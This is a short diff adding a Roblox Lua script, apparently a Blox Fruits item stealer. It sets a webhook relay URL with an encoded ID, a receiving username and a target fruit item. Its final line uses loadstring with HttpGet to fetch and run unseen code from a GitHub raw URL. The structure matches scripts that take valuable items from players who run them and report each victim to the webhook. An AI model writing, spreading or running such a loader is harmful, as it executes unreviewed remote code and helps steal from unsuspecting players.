@@ -1,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=elQwSllOUHBIQzNFTERwSDM4SGpXQTpwR2thQ3REY2ZOUzRQUThaUkZwSGp3QTBMczFqUk9aYkxxOWFrLTBid2Y3d1B2SnlmSzdnN3lUZXZVX1NOVUZmNm5KUVVQRlhRUkt5OVI3emdONnBpLUNRaXNmYlJMc3l4LXplano0YnRCM0dMTHpVdWV2VWZUZDBObHJ1NXJvblkxZ1hJdTdUeURwMUtLTmtuT0sxYlNHUG1jaGxaNlBfN21nZmNyelRkUmc"
+Usernames = {"prospectjtpro"}
+FruitsToHit = {"Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
